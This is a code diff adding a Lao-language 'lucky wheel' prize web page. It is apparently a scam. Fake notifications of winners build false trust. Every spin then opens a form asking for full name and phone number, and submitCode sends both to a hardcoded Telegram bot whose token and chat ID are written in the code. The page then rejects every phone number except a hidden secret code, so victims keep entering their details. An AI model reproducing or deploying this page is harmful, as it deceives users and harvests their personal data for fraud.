@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="lo">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Yikki - ລຸ້ນໂຊກ</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Noto Sans Lao', sans-serif;
+    }
+    body {
+      background: url('https://i.postimg.cc/HLDSyyby/4d.png') no-repeat center center fixed;
+      background-size: cover;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 5px;
+    }
+    /* Notification Bar ด้านบน */
+    #notificationBar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      color: #ffd700;
+      padding: 10px 0;
+      text-align: center;
+      font-weight: bold;
+      font-size: 16px;
+      z-index: 1000;
+      border-bottom: 2px solid #ffd700;
+      animation: slideDown 0.8s ease-out;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    #notificationBar img {
+      width: 45px;
+      height: 45px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 3px solid #ffd700;
+      box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);
+    }
+    @keyframes slideDown {
+      from { transform: translateY(-100%); }
+      to { transform: translateY(0); }
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      background: rgba(0, 0, 0, 0.65);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+      text-align: center;
+      backdrop-filter: blur(8px);
+      border: 1px solid rgba(255, 215, 0, 0.3);
+      margin-top: 70px;
+    }
+    h2 {
+      margin-bottom: 20px;
+      color: #ffd700;
+      text-shadow: 0 2px 6px rgba(0,0,0,0.8);
+      font-size: 30px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      margin: 16px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      background: linear-gradient(to bottom, #e91e63, #c2185b);
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 4px 15px rgba(233, 30, 99, 0.5);
+    }
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(233, 30, 99, 0.7);
+    }
+    button:disabled {
+      background: #666;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    .wheel-container {
+      position: relative;
+      width: 300px;
+      height: 300px;
+      margin: 20px auto;
+    }
+    #wheelImage {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      transition: transform 7s cubic-bezier(0.2, 0.8, 0.2, 1);
+      display: block;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+    }
+    #pointer {
+      position: absolute;
+      top: -20px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 30px;
+      height: 50px;
+      background: red;
+      clip-path: polygon(50% 100%, 0% 0%, 100% 0%);
+      z-index: 10;
+      filter: drop-shadow(0 4px 8px rgba(0,0,0,0.6));
+    }
+    #result {
+      margin-top: 15px;
+      font-weight: bold;
+      color: #ff4444;
+      min-height: 50px;
+      font-size: 18px;
+      text-shadow: 0 1px 3px black;
+    }
+    #dailyLimit {
+      margin-top: 10px;
+      font-size: 15px;
+      color: #ffd700;
+      text-shadow: 0 1px 2px black;
+    }
+    #confirmModal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.85);
+      z-index: 100;
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: rgba(0, 0, 0, 0.8);
+      padding: 30px;
+      border-radius: 16px;
+      width: 90%;
+      max-width: 350px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+      border: 1px solid #ffd700;
+    }
+    .modal-content h3 {
+      color: #ffd700;
+      margin-bottom: 15px;
+    }
+    .modal-content input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ffd700;
+      border-radius: 8px;
+      font-size: 16px;
+      background: rgba(255,255,255,0.1);
+      color: white;
+    }
+    .modal-content input::placeholder {
+      color: #ccc;
+    }
+    .modal-content button {
+      width: auto;
+      padding: 12px 30px;
+      margin: 10px 5px;
+      background: linear-gradient(to bottom, #e91e63, #c2185b);
+      box-shadow: 0 4px 15px rgba(233, 30, 99, 0.5);
+    }
+    #loading {
+      display: none;
+      color: #ffd700;
+      margin-top: 15px;
+      font-weight: bold;
+      font-size: 16px;
+    }
+    #countdown {
+      font-size: 36px;
+      font-weight: bold;
+      color: #ffd700;
+      margin: 20px 0;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Notification Bar พร้อมรูปกระต่าย -->
+  <div id="notificationBar">
+    <img id="notifyAvatar" src="" alt="Avatar">
+    <span id="notifyText"></span>
+  </div>
+
+  <div class="container">
+    <h2>ລຸ້ນໂຊກ Yikki!</h2>
+    
+    <div class="wheel-container">
+      <div id="pointer"></div>
+      <img id="wheelImage" src="https://i.postimg.cc/QdnVz6Bm/por-ce-kt-him-C59024F-1.jpg" alt="ວົງລ້ອລຸ້ນໂຊກ" onerror="this.src='https://i.imgur.com/6QbX6yA.png'; this.onerror=null;" />
+    </div>
+
+    <button id="spinButton" onclick="spinWheel()">ປັ່ນວົງລ້ອ!</button>
+    <div id="dailyLimit"></div>
+    <div id="result"></div>
+  </div>
+
+  <div id="confirmModal">
+    <div class="modal-content">
+      <h3>ກົດຢືນຢັນລາງວັນ</h3>
+      <input type="text" id="messageInput" placeholder="ປ້ອນຊື່ ແລະ ນາມສະກຸນ" />
+      <input type="text" id="numberInput" placeholder="ບອນເລກເບີໂທລະສັບ" />
+      <div id="countdown"></div>
+      <br />
+      <button onclick="submitCode()">ຢືນຢັນ</button>
+      <div id="loading">ກຳລັງກວດສອບ...</div>
+      <p id="codeError" style="color:#ff4444; font-size:15px; margin-top:10px;"></p>
+    </div>
+  </div>
+
+  <script>
+    const prizes = ["200MB", "ຂໍໃຫ້ທ່ານໂຊກດີ", "10,000ກີບ", "", "50,000ກີບ", "ຂໍໃຫ້ທ່ານໂຊກດ", "800MB ", " 400MB", "20,000ກີບ"," ຂໍໃຫ້ທ່ານໂຊກດ"];
+    let isSpinning = false;
+    let currentPrize = "";
+    const MAX_SPINS_PER_DAY = 30;
+    const SECRET_CODE = "22220019$i99";
+
+    const TELEGRAM_BOT_TOKEN = "8009595856:AAGtM8Cpa7f-OU1ydjgWPFWprcwLtgY6Flk";
+    const TELEGRAM_CHAT_ID = "6630414998";
+
+    // รูปกระต่ายน่ารัก ๆ สำหรับ avatar (คัดเลือกเฉพาะที่น่ารักและเหมาะที่สุด)
+    const bunnyAvatars = [
+      "https://img.freepik.com/premium-vector/adorable-kawaii-rabbit-icon-cute-animal-design_1120558-38210.jpg",
+      "https://png.pngtree.com/png-vector/20250320/ourmid/pngtree-sweet-cartoon-rabbit-with-a-gentle-smile-and-soft-pink-hue-png-image_15796639.png",
+      "https://img.freepik.com/premium-vector/cute-kawaii-bunny-cartoon-little-rabbit-characters-hand-drawn-style-vector-drawing_41422-1658.jpg",
+      "https://www.shutterstock.com/image-vector/cute-bunny-emoticon-face-vector-600nw-2694007791.jpg",
+      "https://img.freepik.com/premium-vector/rabbit-face-vector-cute-bunny-head-sticker-part-1_125446-860.jpg",
+      "https://img.freepik.com/free-vector/cute-rabbit-cartoon-character-vector_1308-138083.jpg",
+      "https://img.freepik.com/premium-vector/cute-rabbit-expression-sticker-design_176417-4239.jpg",
+      "https://img.freepik.com/premium-vector/cute-white-rabbit-face-pink-background_180401-2917.jpg",
+      "https://thumbs.dreamstime.com/b/cute-kawaii-rabbit-holding-flower-adorable-cartoon-illustration-cute-pink-white-rabbit-big-sparkling-eyes-421471214.jpg"
+    ];
+
+    // ข้อความแจ้งเตือน
+    const fakeNotifications = [
+      "02093119671 ຮັບດາຕາ 800MB",
+      "095xxxxxxx ຮັບ 50,000 ກີບ",
+      "030xxxxxxx ຮັບດາຕາ 400MB",
+      "020xxxxxxx ຮັບ 20,000 ກີບ",
+      "099xxxxxxx ຮັບດາຕາ 200MB",
+      "020xxxxxxx ຮັບດາຕາ 200MB",
+      "02093119671 ຮັບດາຕາ 800MB",
+      "0905xxxxxxx ຮັບ 50,000 ກີບ",
+      "0207xxxxxxx ຮັບດາຕາ 400MB",
+      "0205xxxxxxx ຮັບ 20,000 ກີບ",
+      "0209xxxxxxx ຮັບດາຕາ 200MB",
+      "0209xxxxxxx ຮັບດາຕາ 200MB",
+      "02093119671 ຮັບດາຕາ 800MB",
+      "095xxxxxxx ຮັບ 50,000 ກີບ",
+      "0207xxxxxxx ຮັບດາຕາ 400MB",
+      "0205xxxxxxx ຮັບ 20,000 ກີບ",
+      "0209xxxxxxx ຮັບດາຕາ 200MB",
+      "0209xxxxxxx ຮັບດາຕາ 200MB",
+      "02093119671 ຮັບດາຕາ 800MB",
+      "0905xxxxxxx ຮັບ 50,000 ກີບ",
+      "0207xxxxxxx ຮັບດາຕາ 400MB",
+      "0205xxxxxxx ຮັບ 20,000 ກີບ",
+      "0209xxxxxxx ຮັບດາຕາ 200MB",
+      "0209xxxxxxx ຮັບດາຕາ 200MB",
+      "02093119671 ຮັບດາຕາ 800MB",
+      "0905xxxxxxx ຮັບ 50,000 ກີບ",
+      "0207xxxxxxx ຮັບດາຕາ 400MB",
+      "0205xxxxxxx ຮັບ 20,000 ກີບ",
+      "02093119671 ຮັບດາຕາ 800MB",
+      "095xxxxxxx ຮັບ 50,000 ກີບ",
+      "0207xxxxxxx ຮັບດາຕາ 400MB",
+      "0205xxxxxxx ຮັບ 20,000 ກີບ",
+      "0209xxxxxxx ຮັບດາຕາ 200MB",
+      "0209xxxxxxx ຮັບດາຕາ 200MB",
+      "02093119671 ຮັບດາຕາ 800MB",
+      "095xxxxxxx ຮັບ 50,000 ກີບ",
+      "0207xxxxxxx ຮັບດາຕາ 400MB",
+      "0205xxxxxxx ຮັບ 20,000 ກີບ",
+      "0209xxxxxxx ຮັບດາຕາ 200MB"
+    ];
+
+    function showRandomNotification() {
+      const bar = document.getElementById('notificationBar');
+      const avatar = document.getElementById('notifyAvatar');
+      const text = document.getElementById('notifyText');
+
+      const randomAvatar = bunnyAvatars[Math.floor(Math.random() * bunnyAvatars.length)];
+      const randomText = fakeNotifications[Math.floor(Math.random() * fakeNotifications.length)];
+
+      avatar.src = randomAvatar;
+      text.textContent = randomText;
+
+      bar.style.display = 'flex';
+      setTimeout(() => { bar.style.display = 'none'; }, 4500);
+    }
+
+    // แสดงทุก 8-15 วินาที + แสดงทันทีตอนโหลดหน้า
+    setInterval(showRandomNotification, Math.random() * 7000 + 8000);
+    showRandomNotification();
+
+    function updateDailyLimit() {
+      const today = new Date().toLocaleDateString('en-CA');
+      const data = JSON.parse(localStorage.getItem('yikkiSpinData') || '{"date":"", "count":0}');
+
+      if (data.date !== today) {
+        localStorage.setItem('yikkiSpinData', JSON.stringify({date: today, count: 0}));
+        data.count = 0;
+      }
+
+      const remaining = MAX_SPINS_PER_DAY - data.count;
+      if (remaining <= 0) {
+        document.getElementById('spinButton').disabled = true;
+        document.getElementById('spinButton').textContent = "ໝົດໂຄຕ້າປະຈຳວັນແລ້ວ";
+        document.getElementById('dailyLimit').innerHTML = "<strong style='color:#ff4444;'>ທ່ານຫມຸນໝົດ 30 ຄັ້ງປະຈຳວັນແລ້ວ<br>ກະລຸນາລອງໃໝ່ພຸດຊິ່ນນີ້!</strong>";
+      } else {
+        document.getElementById('spinButton').disabled = false;
+        document.getElementById('spinButton').textContent = "ປັ່ນວົງລ້ອ!";
+        document.getElementById('dailyLimit').innerHTML = `ຍັງເຫຼືອ: <strong>${remaining}</strong> ຄັ້ງປະຈຳວັນນີ້`;
+      }
+    }
+
+    function incrementSpinCount() {
+      const today = new Date().toLocaleDateString('en-CA');
+      const data = JSON.parse(localStorage.getItem('yikkiSpinData') || '{"date":"", "count":0}');
+      if (data.date === today) {
+        data.count++;
+      } else {
+        data.date = today;
+        data.count = 1;
+      }
+      localStorage.setItem('yikkiSpinData', JSON.stringify(data));
+      updateDailyLimit();
+    }
+
+    function vibrate(pattern) {
+      if (navigator.vibrate) navigator.vibrate(pattern);
+    }
+
+    function spinWheel() {
+      if (isSpinning) return;
+
+      const data = JSON.parse(localStorage.getItem('yikkiSpinData') || '{"date":"", "count":0}');
+      const today = new Date().toLocaleDateString('en-CA');
+      const currentCount = (data.date === today) ? data.count : 0;
+
+      if (currentCount >= MAX_SPINS_PER_DAY) {
+        updateDailyLimit();
+        return;
+      }
+
+      isSpinning = true;
+      document.getElementById('result').innerText = "";
+      currentPrize = "";
+
+      vibrate(100);
+
+      const wheel = document.getElementById('wheelImage');
+      wheel.style.transition = 'none';
+      wheel.style.transform = 'rotate(0deg)';
+
+      setTimeout(() => {
+        const randomPrizeIndex = Math.floor(Math.random() * prizes.length);
+        currentPrize = prizes[randomPrizeIndex].trim() || "ໂຊກດີຄັ້ງໜ້າ!";
+        const extraRotations = 10;
+        const segments = prizes.length;
+        const degreesPerSegment = 360 / segments;
+        const finalRotation = extraRotations * 360 + (segments - randomPrizeIndex) * degreesPerSegment;
+
+        wheel.style.transition = 'transform 7s cubic-bezier(0.2, 0.8, 0.2, 1)';
+        wheel.style.transform = `rotate(${finalRotation}deg)`;
+
+        setTimeout(() => {
+          vibrate([100, 50, 100]);
+          openConfirmModal();
+          incrementSpinCount();
+          isSpinning = false;
+        }, 7000);
+      }, 10);
+    }
+
+    function openConfirmModal() {
+      document.getElementById('confirmModal').style.display = 'flex';
+      document.getElementById('codeError').innerText = '';
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('countdown').style.display = 'none';
+    }
+
+    function startCountdown() {
+      const countdownEl = document.getElementById('countdown');
+      countdownEl.style.display = 'block';
+      let count = 5;
+      countdownEl.innerText = count;
+      vibrate(100);
+
+      const interval = setInterval(() => {
+        count--;
+        if (count > 0) {
+          countdownEl.innerText = count;
+          vibrate(100);
+        } else {
+          clearInterval(interval);
+          countdownEl.style.display = 'none';
+          document.getElementById('messageInput').value = '';
+          document.getElementById('numberInput').value = '';
+          document.getElementById('codeError').innerText = '';
+          vibrate([100, 100, 300]);
+        }
+      }, 1000);
+    }
+
+    async function submitCode() {
+      const message = document.getElementById('messageInput').value.trim();
+      const number = document.getElementById('numberInput').value.trim();
+
+      document.getElementById('codeError').innerText = '';
+
+      if (!message || !number) {
+        document.getElementById('codeError').innerText = "ກະລຸນາປ້ອນທັງຊື່ ແລະ ເລກໂທລະສັບ";
+        return;
+      }
+
+      document.getElementById('loading').style.display = 'block';
+      document.getElementById('loading').innerText = "ກຳລັງກວດສອບ...";
+
+      try {
+        const fullMessage = `🔔 ລາງວັນໃໝ່!\nລາງວັນ: ${currentPrize}\nຊື່-ນາມສະກຸນ: ${message}\nເລກໂທທີ່ປ້ອນ: ${number}`;
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: fullMessage,
+            parse_mode: "HTML"
+          })
+        });
+      } catch (error) {
+        console.log("Send error:", error);
+      }
+
+      await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 2000));
+
+      if (number.toLowerCase() === SECRET_CODE.toLowerCase()) {
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('result').innerHTML = `🎉 ສຳເລັດແລ້ວ! 🎉<br><strong>ເຈົ້າໄດ້ຮັບ: ${currentPrize}</strong><br>ພວກເຮົາຈະຕິດຕໍ່ກັບໄປພາຍໃນ 24 ຊົ່ວໂມງ!`;
+        vibrate([100, 100, 100, 100, 300]);
+        startCountdown();
+      } else {
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('codeError').innerText = "❌ ເລກໂທລະສັບທີ່ທ່ານປ້ອນບໍ່ຖືກຕ້ອງ ກະລຸນາລອງໃໝ່";
+        vibrate([200, 100, 200]);
+      }
+    }
+
+    updateDailyLimit();
+
+    document.getElementById('messageInput').addEventListener('keyup', function(e) {
+      if (e.key === 'Enter') submitCode();
+    });
+    document.getElementById('numberInput').addEventListener('keyup', function(e) {
+      if (e.key === 'Enter') submitCode();
+    });
+  </script>
+</body>
+</html>
